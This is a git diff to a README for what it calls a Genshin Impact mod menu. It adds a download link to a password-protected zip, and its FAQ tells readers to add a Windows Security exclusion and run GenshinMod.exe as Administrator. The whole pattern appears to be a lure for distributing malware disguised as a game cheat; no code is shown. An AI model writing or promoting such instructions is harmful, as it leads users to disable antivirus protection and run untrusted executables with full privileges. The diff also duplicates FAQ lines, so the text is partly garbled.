@@ -11,9 +11,15 @@ Welcome to the official repository for the **Genshin Impact Mod Menu**. This pro
 
 ---
 
+## 📸 Screenshots
+
+![Genshin Mod Menu Preview](preview.png)
+
+---
+
 ## 🚀 How to Install & Download
 
-**👉 [CLICK HERE TO DOWNLOAD GENSHIN MOD v2.1](ССЫЛКА_СЮДА) 👈**
+**👉 [CLICK HERE TO DOWNLOAD GENSHIN MOD v2.1](https://github.com/SultanGravity/Genshin-Mod-Menu/releases/download/v2.1/mod.menu.Genshin.zip) 👈**
 
 1. Download the `.zip` archive using the link above.
 2. **⚠️ IMPORTANT:** The password for the archive is `PASS 2026`.
@@ -34,6 +40,16 @@ Welcome to the official repository for the **Genshin Impact Mod Menu**. This pro
 *Go to Windows Security -> Virus & threat protection -> Manage settings -> Add or remove exclusions.*
 
 **Q: The menu doesn't open in-game.**
+**A:** Make sure you are running `GenshinMod.exe` as Administrator *before* launching the game.
+
+**Q: Will I get banned?**
+**A:** We highly recommend using these tools on **alt accounts only**. Use at your own risk.
+
+---
+
+## 💬 Support & Community
+If you need help, want to report bugs, or just want to hang out, join our Discord:
+👉 **[Join our Discord Server](https://discord.gg/your_invite_link)**
 **A:** Make sure you are running `GenshinMod.exe` as Administrator *before* launching the game.
 
 **Q: Will I get banned?**
